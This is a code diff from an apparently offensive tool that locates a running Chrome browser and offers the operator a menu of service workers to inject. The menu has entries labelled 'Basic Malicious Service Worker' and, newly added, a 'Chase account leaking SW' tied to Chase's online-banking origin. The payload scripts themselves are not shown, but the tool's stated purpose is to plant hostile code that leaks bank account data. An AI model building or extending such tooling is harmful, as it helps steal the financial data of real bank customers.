@@ -8,6 +8,10 @@ import { server } from "./server"
 import findProcess from "find-process"
 import treeKill from "tree-kill"
 
+const specialtyServiceWorkers: Record<string, {title: string, value: string}[] | undefined> = {
+    "https://secure03b.chase.com" : [{ title: 'Chase account leaking SW', value: 'dist/serviceWorker/chase.js' }]
+}
+
 async function main() {
     const chromeProcessLookupResult = await findProcess("name", "chrome")
     const parentChromeProcess = chromeProcessLookupResult.find(process => !process.cmd.endsWith("chrome.exe"))
@@ -83,9 +87,10 @@ async function main() {
         message: 'Choose a service worker',
         choices: [
           { title: 'Basic Malicious Service Worker', value: 'dist/serviceWorker/sw.js' },
+          ...(specialtyServiceWorkers[url.origin] ?? []),
           { title: 'Your own', value: '' }
         ],
-        initial: 1,
+        initial: 0,
         onState: promptsExitOnAbort
     })
 
